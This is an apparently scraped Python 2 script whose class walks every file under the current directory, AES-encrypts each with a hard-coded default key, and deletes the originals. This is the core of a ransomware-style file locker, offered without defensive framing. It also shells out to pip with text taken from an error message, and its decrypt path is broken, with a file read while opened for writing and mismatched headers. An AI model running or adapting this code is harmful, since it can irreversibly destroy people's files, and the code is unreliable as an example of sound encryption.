1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
#!/usr/bin/python

import os
try:
	import sys
	import pip
	import random
	import platform
	import pkg_resources
	from Crypto.Hash import SHA256
	from Crypto.Cipher import AES
except ImportError as e:
	pip = lambda : os.system('pip install' + str(e)[15:])
	pip()


class RAW:

	_chunk = None
	_identifier = None
	_ = None
	BLOCK_SIZE = None

	# constructor
	def __init__(self):
		self.init()

	# initializer
	def init(cls):
		cls._chunk = 65 * 1024
		cls._identifier = ".(encrypted)"
		cls._ = None
		cls.BLOCK_SIZE = 16

	# encrypt file using a key
	def encrypt(cls, key, filename):
		out_file = os.path.join(os.path.dirname(filename), cls._identifier + os.path.basename(filename))
		file_size = str(os.path.getsize(filename)).zfill(cls.BLOCK_SIZE)
		IV = ''
		for i in range(cls.BLOCK_SIZE):
			IV += chr(random.randint(0, 0xFF))
		cls._ = AES.new(key, AES.MODE_CBC, IV)
		#cls._ = AES.new(key, AES.block_size, IV)
		with open(filename, 'rb') as i_file:
			with open(out_file, 'wb') as o_file:
				o_file.write(filename)
				o_file.write(IV)
				while True:
					chunk = i_file.read(cls._chunk)
					if(len(chunk) == 0):
						break
					elif(len(chunk) % cls.BLOCK_SIZE != 0):
						chunk += ' ' * (cls.BLOCK_SIZE - (len(chunk) % cls.BLOCK_SIZE))
					o_file.write(cls._.encrypt(chunk))

			
	# decrypt a file using a key
	def decrypt(cls, key, filename):
		out_file = os.path.join(os.path.dirname(filename), os.path.basename(filename[12:]))
		with open(filename, 'rb') as o_file:
			file_size = o_file.read(cls.BLOCK_SIZE)
			IV = o_file.read(cls.BLOCK_SIZE)
		cls._ = AES.new(key, AES.MODE_CBC, IV)
		#cls._ = AES.new(key, AES.block_size, IV)
		with open(out_file, 'wb') as i_file:
			while True:
				try:
					chunk = i_file.read(cls._chunk)
					if(len(chunk) == 0):
						break
					i_file.write(cls._.decrypt(chunk))
				except Exception as e:
					print (e)
			i_file.truncate(int(file_size))


	# sort files
	def file_sort(cls):
		all_files = []
		for root, subfolders, files in os.walk(os.getcwd()):
			for names in files:
				all_files.append(os.path.join(root, names))
		return all_files


	# AES handler
	def handler(cls, data, flag, key='EOFEOFEOFEOFEOFX'):
		# encryption section (ALL FILES)
		if(flag == 'ea'):
			sorted_files = cls.file_sort()
			for f in sorted_files:
				if(os.path.basename(f).startswith(".(encrypted)")):			      
					return "<!> '{}' is already encrypted".format(str(f))
				elif(f == os.path.join(os.getcwd(), sys.argv[0])):
					pass        
				else:
					cls.encrypt(SHA256.new(key).digest(), str(f))
					os.remove(f)                                   
					return "<!> Done encrypting '{}'".format(str(f))
		# encrypt 
		elif(flag == 'e'):
			if(not os.path.exists(data)):
				return "<!> The file '{}' does not exist".format(str(data))
			elif(data.startswith(".(encrypted)")):
				return "<!> '{}' is already encrypted".format(str(data))		      
			else:
				cls.encrypt(SHA256.new(key).digest(), str(data))
				os.remove(data)                                   
				return "<!> Done encrypting '{}'".format(str(data))
		# decryption section (ALL FILES)
		elif(flag == 'da'):
			sorted_files = cls.file_sort()
			for f in sorted_files:
				if(not os.path.basename(f).startswith(".(encrypted)")):			      
					return "<!> Cannot decrypt : '{}' is not encrypted!".format(str(f))
				elif(f == os.path.join(os.getcwd(), sys.argv[0])):
					pass        
				else:
					cls.decrypt(SHA256.new(key).digest(), str(f))
					os.remove(f)
					return "<!> Done decrypting '{}'".format(str(f))
		# decryption section (SINGLE FILE)
		elif(flag == 'd'):
			if(not os.path.exists(data)):
				return "<!> The file '{}' does not exist".format(str(data))
			elif(not data.startswith(".(encrypted)")):
				return "<!> Cannot decrypt : '{}' is not encrypted".format(str(data))
			else:
				cls.decrypt(SHA256.new(key).digest(), data)
				os.remove(data)                            
				return "<!> Done decrypting '{}'".format(str(data))
		else:
			print "<!> '{}' is not an option!".format(str(flag))
